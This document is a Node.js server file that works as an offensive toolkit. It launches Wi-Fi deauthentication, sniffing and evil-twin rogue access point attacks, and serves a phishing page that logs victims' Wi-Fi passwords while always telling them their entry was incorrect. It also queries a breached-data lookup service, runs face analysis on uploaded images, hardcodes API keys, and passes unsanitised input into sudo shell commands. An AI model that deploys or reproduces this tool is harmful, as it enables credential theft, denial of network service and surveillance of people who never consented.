
const http = require('http');
const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const { spawn } = require('child_process');
const WebSocket = require('ws');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = 3000;
const JWT_SECRET = 'your-super-secret-key-change-this';
const LEAKOSINT_API_TOKEN = '7341190291:PskyuyED';
const EDENAI_API_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMGQ5YmYzMzAtYzAyNS00NTM4LThlZGYtYzQxMDkxODBjMGU1IiwidHlwZSI6InNhbmRib3hfYXBpX3Rva2VuIn0.FmmXc_Fec46CbqfCPemxBB3UVVcTIWPhsfnlprwS2h8';
const USERS_DB_PATH = path.join(__dirname, 'users.json');
const UPLOADS_DIR = path.join(__dirname, 'uploads');
const WIFI_BASE_INTERFACE = 'wlan1';
const PASSWORDS_LOG_FILE = path.join(__dirname, 'passwords.log');

let activeProcesses = [];
let evilTwinState = { active: false, targetSsid: '' };

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

wss.on('connection', ws => {
    console.log('Client connected to WebSocket');
    ws.on('close', () => {
        console.log('Client disconnected, stopping all attacks.');
        stopAllAttacks();
    });
});

function broadcast(data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(data));
        }
    });
}

function runCommandAndPipe(command, args = []) {
    const child = spawn(command, args);
    activeProcesses.push(child);

    child.stdout.on('data', data => {
        const output = data.toString();
        console.log(`[${command} stdout]: ${output.trim()}`);
        broadcast({ type: 'console', data: output });
    });

    child.stderr.on('data', data => {
        const output = data.toString();
        console.error(`[${command} stderr]: ${output.trim()}`);
        broadcast({ type: 'console', error: true, data: output });
    });

    child.on('close', code => {
        const message = `Process ${command} exited with code ${code}`;
        console.log(message);
        broadcast({ type: 'console', data: `\n--- ${message} ---\n` });
        activeProcesses = activeProcesses.filter(p => p.pid !== child.pid);
    });
    return child;
}

function stopAllAttacks() {
    activeProcesses.forEach(p => p.kill('SIGINT'));
    activeProcesses = [];
    const monitorInterface = `${WIFI_BASE_INTERFACE}mon`;
    const command = `sudo airmon-ng stop ${monitorInterface} && sudo systemctl restart NetworkManager && sudo systemctl restart dnsmasq`;
    spawn('bash', ['-c', command]);
    evilTwinState.active = false;
    console.log('All attack processes stopped and network reset.');
}

const readUsers = () => { if (!fs.existsSync(USERS_DB_PATH)) return []; const data = fs.readFileSync(USERS_DB_PATH); return JSON.parse(data); };
const writeUsers = (users) => { fs.writeFileSync(USERS_DB_PATH, JSON.stringify(users, null, 2)); };
const storage = multer.diskStorage({ destination: (req, file, cb) => cb(null, UPLOADS_DIR), filename: (req, file, cb) => { const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9); cb(null, (req.user ? req.user.id : 'anon') + '-' + uniqueSuffix + path.extname(file.originalname)); } });
const upload = multer({ storage: storage });
const authMiddleware = (req, res, next) => { const authHeader = req.headers.authorization; if (!authHeader || !authHeader.startsWith('Bearer ')) { return res.status(401).json({ message: 'Authorization token required' }); } const token = authHeader.split(' ')[1]; try { req.user = jwt.verify(token, JWT_SECRET); next(); } catch (error) { return res.status(401).json({ message: 'Invalid or expired token' }); } };

app.post('/api/register', (req, res) => { const { name, email, password } = req.body; if (!name || !email || !password) { return res.status(400).json({ message: 'All fields are required' }); } const users = readUsers(); if (users.find(u => u.email === email)) { return res.status(409).json({ message: 'Email already registered' }); } const hashedPassword = bcrypt.hashSync(password, 8); const newUser = { id: users.length > 0 ? Math.max(...users.map(u => u.id)) + 1 : 1, name, email, password: hashedPassword, avatarUrl: null }; users.push(newUser); writeUsers(users); const token = jwt.sign({ id: newUser.id, email: newUser.email }, JWT_SECRET, { expiresIn: '24h' }); const { password: _, ...profile } = newUser; res.status(201).json({ token, profile }); });
app.post('/api/login', (req, res) => { const { email, password } = req.body; const users = readUsers(); const user = users.find(u => u.email === email); if (!user || !bcrypt.compareSync(password, user.password)) { return res.status(401).json({ message: 'Invalid credentials' }); } const token = jwt.sign({ id: user.id, email: user.email }, JWT_SECRET, { expiresIn: '24h' }); const { password: _, ...profile } = user; res.status(200).json({ token, profile }); });
app.get('/api/profile', authMiddleware, (req, res) => { const users = readUsers(); const user = users.find(u => u.id === req.user.id); if (!user) return res.status(404).json({ message: 'User not found' }); const { password: _, ...profile } = user; res.status(200).json(profile); });
app.put('/api/profile', authMiddleware, (req, res) => { const { name } = req.body; if (!name) return res.status(400).json({ message: 'Name is required' }); let users = readUsers(); const userIndex = users.findIndex(u => u.id === req.user.id); if (userIndex === -1) return res.status(404).json({ message: 'User not found' }); users[userIndex].name = name; writeUsers(users); const { password: _, ...updatedProfile } = users[userIndex]; res.status(200).json({ message: 'Profile updated successfully', profile: updatedProfile }); });
app.post('/api/profile/avatar', authMiddleware, upload.single('avatar'), (req, res) => { if (!req.file) return res.status(400).json({ message: 'No file uploaded' }); let users = readUsers(); const userIndex = users.findIndex(u => u.id === req.user.id); if (userIndex === -1) return res.status(404).json({ message: 'User not found' }); const avatarUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`; users[userIndex].avatarUrl = avatarUrl; writeUsers(users); res.status(200).json({ message: 'Avatar uploaded successfully', avatarUrl }); });
app.post('/api/search/osint', authMiddleware, async (req, res) => { const { query } = req.body; if (!query) return res.status(400).json({ message: 'Search query is required' }); try { const apiRequestData = { token: LEAKOSINT_API_TOKEN, request: query, limit: 100, lang: 'en' }; const response = await axios.post('https://leakosintapi.com/', apiRequestData); res.status(200).json(response.data); } catch (error) { res.status(500).json({ message: 'Failed to fetch data from OSINT API' }); } });
app.post('/api/analyze/face', authMiddleware, upload.single('image'), async (req, res) => { if (!req.file) { return res.status(400).json({ message: 'Image file is required' }); } const form = new FormData(); form.append('providers', 'amazon,google,microsoft'); form.append('file', fs.createReadStream(req.file.path)); form.append('fallback_providers', ''); try { const response = await axios.post('https://api.edenai.run/v2/image/face_detection', form, { headers: { ...form.getHeaders(), 'Authorization': `Bearer ${EDENAI_API_KEY}`, }, }); fs.unlinkSync(req.file.path); res.status(200).json(response.data); } catch (error) { fs.unlinkSync(req.file.path); res.status(500).json({ message: 'Failed to analyze face' }); } });

app.post('/api/network/deauth', authMiddleware, (req, res) => {
    stopAllAttacks();
    const { bssid } = req.body;
    if (!bssid) return res.status(400).json({ message: 'BSSID is required' });
    const monitorInterface = `${WIFI_BASE_INTERFACE}mon`;
    const command = `sudo airmon-ng start ${WIFI_BASE_INTERFACE} && sudo aireplay-ng --deauth 0 -a ${bssid} ${monitorInterface}`;
    runCommandAndPipe('bash', ['-c', command]);
    res.status(200).json({ message: 'Deauth attack initiated.' });
});

app.post('/api/network/sniff', authMiddleware, (req, res) => {
    stopAllAttacks();
    const monitorInterface = `${WIFI_BASE_INTERFACE}mon`;
    const command = `sudo airmon-ng start ${WIFI_BASE_INTERFACE} && sudo airodump-ng ${monitorInterface}`;
    runCommandAndPipe('bash', ['-c', command]);
    res.status(200).json({ message: 'Packet sniffing initiated.' });
});

app.post('/api/network/evil-twin', authMiddleware, (req, res) => {
    stopAllAttacks();
    const { bssid, ssid, channel } = req.body;
    if (!bssid || !ssid || !channel) {
        return res.status(400).json({ message: 'BSSID, SSID, and Channel are required' });
    }
    
    evilTwinState = { active: true, targetSsid: ssid };
    
    const hostapdConf = `interface=${WIFI_BASE_INTERFACE}mon\nssid=${ssid}\nchannel=${channel}\ndriver=nl80211\nhw_mode=g\n`;
    fs.writeFileSync('/tmp/hostapd-evil.conf', hostapdConf);

    const monitorInterface = `${WIFI_BASE_INTERFACE}mon`;
    const commands = [
        `sudo airmon-ng start ${WIFI_BASE_INTERFACE}`,
        `sudo ip addr flush dev ${monitorInterface}`,
        `sudo ip addr add 10.0.0.1/24 dev ${monitorInterface}`,
        `sudo ip link set ${monitorInterface} up`,
        `sudo systemctl restart dnsmasq`,
        `sudo hostapd /tmp/hostapd-evil.conf &`,
        `sudo aireplay-ng --deauth 0 -a ${bssid} ${monitorInterface}`
    ];
    
    const combinedCommand = commands.join(' && ');
    runCommandAndPipe('bash', ['-c', combinedCommand]);

    res.status(200).json({ message: `Evil Twin attack on '${ssid}' initiated.` });
});

app.get('/phishing-page', (req, res) => {
    if (!evilTwinState.active) {
        return res.status(404).send('No active attack.');
    }
    fs.readFile(path.join(__dirname, 'public', 'index.html'), 'utf8', (err, data) => {
        if (err) {
            return res.status(500).send('Error loading page.');
        }
        const renderedHtml = data.replace(/{{SSID}}/g, evilTwinState.targetSsid);
        res.send(renderedHtml);
    });
});

app.post('/capture-password', (req, res) => {
    const { password } = req.body;
    if (!password) {
        return res.status(400).json({ correct: false });
    }
    const logEntry = `[${new Date().toISOString()}] SSID: ${evilTwinState.targetSsid} | Password: ${password}\n`;
    fs.appendFileSync(PASSWORDS_LOG_FILE, logEntry);
    broadcast({ type: 'password', data: { ssid: evilTwinState.targetSsid, password: password } });
    
    res.status(200).json({ correct: false, message: 'Incorrect password. Please try again.' });
});

app.post('/api/network/stop-attack', authMiddleware, (req, res) => {
    stopAllAttacks();
    res.status(200).json({ message: 'All attacks have been stopped.' });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server with WebSocket is running. Access it from your phone at http://68.183.178.199:${PORT}`);
});
